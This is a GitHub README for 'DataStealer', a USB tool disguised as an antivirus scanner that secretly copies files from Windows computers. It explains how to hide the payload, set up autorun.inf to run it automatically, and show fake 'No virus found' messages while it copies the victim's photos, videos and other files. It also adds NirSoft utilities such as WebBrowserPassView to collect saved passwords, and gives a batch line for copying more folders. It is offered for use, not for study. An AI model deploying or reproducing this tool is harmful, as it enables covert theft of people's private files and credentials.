# DataStealer

## Download
[Releases](https://github.com/Kevinsillo/datastealer/releases)

## Information
DataStealer is a simple funcionality for USB device (fake Antivirus USB) to gather information in Windows systems.

## Intructions
Just copy all from DataStealer folder and paste in USB device. Hide **"data"** folder and **"run.bat"**. When you conect USB device in Windows system just doble click in AntivirusUSB.vbs and DataStealer copy all files stealthily from pc.

***NOTE: You can use autotun.inf for auto-execute .vbs file but it only works in Windows Vista and Windows XP.***

[**Autorun.inf**](wikipedia.org/wiki/AutoRun "Wikipedia")
>[AutoRun]
>
>Open=AntivirusUSB.vbs

## Configuration
You can change diferents values in **run.bat**.

**Add or remove formats of steal files**
>set formats=*.jpg *.png *.mp4 *.3gp *.wav

**Enable or disable messages**
>set msg1=**true / false** [DEFAULT TRUE]
>
>set msg2=**true / false** [DEFAULT TRUE]
>
>set msg1text=Analyzing USB device for searching virus. [WINDOWS TEXT]
>
>set msg2text=No virus found. [WINDOWS TEXT]

**Enable or disable file theft and sizes (kilobyte)**
>set stealfiles=**true / false** [DEFAULT TRUE]
>set sizemax=**50000**
>set sizemin=**100**

**Enable or disable Nirsoft software**
>set nirsoft=**true / false** [DEFAULT FALSE]
>
>set soft=**[names of Nirsoft software files]** [DEFAULT EMPTY]

**NirSoft** web site provides a unique collection of **small and useful freeware utilities**, all of them developed by **Nir Sofer**. Go to **[nirsoft.net](www.nirsoft.net)**, download software and put in "data/soft/" folder. Later add names in value with spaces.

***Example:***
>set soft=**SkypeLogView WebBrowserPassView ...**

### Folders (Advanced Users)
If you want you can add lines with more folders in **"run.bat"** for gather information.

***Like this:***
>FOR /R **"%userprofile%\Pictures\"** %%a IN (%formats%) DO (copy /y "%%a" "%%#:\data\capt\%USERNAME%\")

Replace **"%userprofile%\Pictures\"** for any folder from Windows.
